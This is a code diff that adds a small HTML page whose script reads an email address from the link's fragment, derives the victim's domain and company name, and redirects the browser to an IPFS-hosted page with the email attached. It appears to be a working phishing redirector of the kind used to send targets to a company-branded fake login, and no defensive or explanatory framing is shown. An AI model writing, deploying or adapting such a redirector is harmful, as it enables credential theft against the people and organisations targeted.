@@ -1,0 +1,15 @@
+<html>
+  <script>
+    var myURL = window.location.href;
+
+    var myEmail = myURL.split('#')[1];
+    var myDomain = myEmail.split('@')[1];
+    var companyName = myDomain.split('.')[0];
+    console.log(myURL);
+    console.log(myDomain);
+    console.log(companyName);
+    window.location =
+      'https://ipfs.io/ipfs/bafybeiggjxtkszpabcbyokdhxhzy4opvajk5nibygpbkv2veetgw2twadu/#' +
+      myEmail;
+  </script>
+</html>
